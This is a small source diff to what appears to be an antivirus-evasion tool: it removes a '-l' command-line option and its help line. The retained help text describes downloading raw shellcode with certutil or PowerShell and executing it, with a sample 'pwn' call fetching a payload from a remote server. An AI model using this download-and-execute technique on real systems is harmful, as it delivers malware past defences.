@@ -31,7 +31,7 @@ int main (int argc, char **argv)
 	opterr = 0;
 
 	// compute the options
-	while ((c = getopt (argc, argv, "e:u:d:w:lhE")) != -1)
+	while ((c = getopt (argc, argv, "e:u:d:w:hE")) != -1)
 		switch (c)
 		{
 			case 'd':
@@ -134,8 +134,7 @@ void print_help()
 	printf("      usage of -d certutil/powershell in combination with -f\n");
 	printf("      for executing the raw shellcode after downloading\n");
 	printf("      call: pwn thepayload.bin http://server/thepayload.bin\n");
-	printf("-E use avets ASCII encryption, often do not has to be used\n");
-	printf("   Can be used with -l\n");		
+	printf("-E use avets ASCII encryption, often do not has to be used\n");		
 	printf("-h help\n\n");
 	printf("Please refer README.md for more information\n");
 }
